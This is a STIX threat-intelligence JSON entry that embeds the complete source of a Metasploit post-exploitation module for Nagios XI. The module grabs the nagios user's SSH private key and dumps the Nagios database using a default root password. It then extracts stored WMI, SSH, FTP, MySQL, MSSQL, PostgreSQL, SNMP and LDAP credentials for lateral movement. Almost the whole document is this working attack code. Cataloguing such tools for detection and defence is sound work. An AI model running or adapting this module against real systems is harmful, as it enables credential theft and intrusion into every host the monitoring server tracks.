{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--127181ea-4807-40ca-8b40-ed64181edba0",
    "created": "2024-08-14T16:33:17.988358Z",
    "modified": "2024-08-14T16:33:17.988362Z",
    "name": "Nagios XI Enumeration",
    "description": " NagiosXI may store credentials of the hosts it monitors. This module extracts these credentials creating opportunities for lateral movement.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/enum_nagios_xi.rb",
            "external_id": "enum_nagios_xi.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Linux::System\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Nagios XI Enumeration',\n          'Description' => %q{\n            NagiosXI may store credentials of the hosts it monitors. This module extracts these credentials,\n            creating opportunities for lateral movement.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Cale Smith', # @0xC413\n          ],\n          'DisclosureDate' => '2018-04-17',\n          'Platform' => 'linux',\n          'SessionTypes' => ['shell', 'meterpreter']\n        }\n      )\n      )\n    register_options([\n      OptString.new('DB_ROOT_PWD', [true, 'Password for DB root user, an option if they change this', 'nagiosxi' ])\n    ])\n  end\n\n  # save found creds in the MSF DB for easy use\n  # , login)\n  def report_obj(cred, login)\n    return if cred.nil? || login.nil?\n\n    credential_data = {\n      origin_type: :session,\n      post_reference_name: fullname,\n      session_id: session_db_id,\n      workspace_id: myworkspace_id\n    }.merge(cred)\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      workspace_id: myworkspace_id\n    }.merge(login)\n\n    create_credential_login(login_data)\n  end\n\n  # parse out domain realm for windows services\n  def parse_realm(username)\n    userealm = username.split('/')\n\n    if userealm.count > 1\n      realm = userealm[0]\n      username = userealm[1]\n\n      credential_data = {\n        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n        realm_value: realm,\n        username: username\n      }\n    else\n      credential_data = {\n        username: username\n      }\n\n    end\n\n    return credential_data\n  end\n\n  def run\n    @peer = \"#{session.session_host}:#{session.session_port}\"\n\n    @creds = []\n    @ssh_keys = []\n\n    # get nagios SSH private key\n    id_rsa_path = '/home/nagios/.ssh/id_rsa'\n    if file?(id_rsa_path)\n      print_good('Attempting to grab Nagios SSH key')\n      ssh_key = read_file(id_rsa_path)\n      ssh_key_loot = store_loot(\n        'nagios_ssh_priv_key',\n        'text/plain',\n        session,\n        ssh_key,\n        nil\n      )\n      print_status(\"Nagios SSH key stored in #{ssh_key_loot}\")\n    else\n      print_status('No SSH key found')\n    end\n\n    print_status('Attempting to dump Nagios DB')\n    db_dump_file = \"/tmp/#{Rex::Text.rand_text_alpha(6)}\"\n\n    sql_query = %(mysql -u root -p#{datastore['DB_ROOT_PWD']} -e \")\n    sql_query << %|SELECT nagios_services.check_command_object_id, nagios_hosts.address, REPLACE(nagios_services.check_command_args,'\\\\\"','%22') FROM nagios.nagios_hosts |\n    sql_query << %(INNER JOIN nagios.nagios_services on nagios_hosts.host_object_id=nagios_services.host_object_id )\n    sql_query << %(INNER JOIN nagios.nagios_commands on nagios_commands.object_id = nagios_services.check_command_object_id )\n    sql_query << %(WHERE nagios_services.check_command_object_id!=89 )\n    sql_query << %(ORDER BY nagios_services.check_command_object_id )\n    sql_query << %(INTO OUTFILE '#{db_dump_file}' FIELDS TERMINATED BY ',' ENCLOSED BY '\\\\\"' LINES TERMINATED BY '\\\\n' ;\")\n\n    out = cmd_exec(sql_query)\n    if out.match(/error/i)\n      print_error(\"Could not get DB contents: #{out.gsub(/\\n/, ' ')}\")\n      return\n    else\n      db_dump = read_file(db_dump_file)\n      print_good('Nagios DB dump successful')\n      # store raw db results, there is likely good stuff in here that we don't parse out\n      db_loot = store_loot(\n        'nagiosxi_raw_db_dump',\n        'text/plain',\n        session,\n        db_dump,\n        nil\n      )\n      print_status(\"Raw Nagios DB dump #{db_loot}\")\n      print_status(\"Look through the DB dump manually. There could be\\ some good loot we didn't parse out.\")\n    end\n\n    CSV.parse(db_dump) do |row|\n      case row[0]\n      when '110' # WMI\n        host = row[1]\n        creds = row[2].split('!')\n        username = creds[0].match(/'(.*?)'/)[1]\n        password = creds[1].match(/'(.*?)'/)[1]\n\n        user_credential_data = parse_realm(username)\n\n        credential_data = {\n          private_data: password,\n          private_type: :password\n        }.merge(user_credential_data)\n\n        login_data = {\n          address: host,\n          port: 135,\n          service_name: 'WMI',\n          protocol: 'tcp'\n        }\n\n      when '59' # SSH\n        host = row[1]\n\n        credential_data = {\n          username: 'nagios',\n          private_data: ssh_key,\n          private_type: :ssh_key\n        }\n\n        login_data = {\n          address: host,\n          port: 22,\n          service_name: 'SSH',\n          protocol: 'tcp'\n        }\n\n      when '25' # FTP\n        host = row[1]\n        creds = row[2].split('!')\n        username = creds[0]\n        password = creds[1]\n\n        credential_data = {\n          username: username,\n          private_data: password,\n          private_type: :password\n        }\n\n        login_data = {\n          address: host,\n          port: 21,\n          service_name: 'FTP',\n          protocol: 'tcp'\n        }\n\n      when '67' # MYSQL\n        host = row[1]\n        username = row[2].match(/--username=(.*?)\\s/)[1]\n        password = row[2].match(/--password=%22(.*?)%22/)[1]\n\n        credential_data = {\n          username: username,\n          private_data: password,\n          private_type: :password\n        }\n\n        login_data = {\n          address: host,\n          port: 3306,\n          service_name: 'MySQL',\n          protocol: 'tcp'\n        }\n\n      when '66' # MSSQL\n        host = row[1]\n        username = row[2].match(/-U '(.*?)'/)[1]\n        password = row[2].match(/-P '(.*?)'/)[1]\n\n        user_credential_data = parse_realm(username)\n        credential_data = {\n          private_data: password,\n          private_type: :password\n        }.merge(user_credential_data)\n\n        login_data = {\n          address: host,\n          port: 1433,\n          service_name: 'MSSQL',\n          protocol: 'tcp'\n        }\n\n      when '76' # POSTGRES\n        host = row[1]\n        username = row[2].match(/--dbuser=(.*?)\\s/)[1]\n        password = row[2].match(/--dbpass=%22(.*?)%22/)[1]\n\n        credential_data = {\n          username: username,\n          private_data: password,\n          private_type: :password\n        }\n\n        login_data = {\n          address: host,\n          port: 5432,\n          service_name: 'PostgreSQL',\n          protocol: 'tcp'\n        }\n\n      when '85' # SNMP\n        host = row[1]\n        creds = row[2].split('!')\n        password = ' '\n        username = creds[0]\n        port = 161\n\n        credential_data = {\n          username: username,\n          private_data: password,\n          private_type: :password\n        }\n\n        login_data = {\n          address: host,\n          port: 161,\n          service_name: 'SNMP',\n          protocol: 'udp'\n        }\n\n      when '88' # LDAP\n        host = row[1]\n        username = row[2].match(/-D %22(.*?)%22/)[1]\n        password = row[2].match(/-P %22(.*?)%22/)[1]\n\n        credential_data = {\n          username: username,\n          private_data: password,\n          private_type: :password\n        }\n\n        login_data = {\n          address: host,\n          port: 389,\n          service_name: 'LDAP',\n          protocol: 'tcp'\n        }\n      else\n        # base case\n      end\n      unless credential_data.nil? || login_data.nil?\n        report_obj(credential_data, login_data)\n      end\n    end\n\n    print_status(\"Run 'creds' to see credentials loaded into the MSF DB\")\n\n    # cleanup db dump\n    register_file_for_cleanup(db_dump_file)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-04-17",
    "x_mitre_platforms": [
        "linux'"
    ]
}